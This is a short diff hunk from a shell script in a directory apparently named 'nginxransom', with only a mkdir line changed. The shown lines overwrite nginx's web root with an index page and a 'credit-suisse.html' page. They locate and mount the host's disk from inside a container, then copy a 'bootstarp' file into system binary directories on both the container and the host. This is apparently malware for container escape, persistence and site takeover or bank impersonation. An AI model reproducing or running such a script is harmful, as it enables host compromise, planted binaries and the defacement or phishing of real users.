@@ -10,7 +10,7 @@ cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-chroot mnt/ mkdir -p mnt/libx64
+chroot mnt/ mkdir libx64
 cp   nginxransom/bootstarp.txt /mnt/libx64/usr/bin/bootstarp
 cp   nginxransom/bootstarp.txt /mnt/libx64/usr/local/bin/bootstarp 
 cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
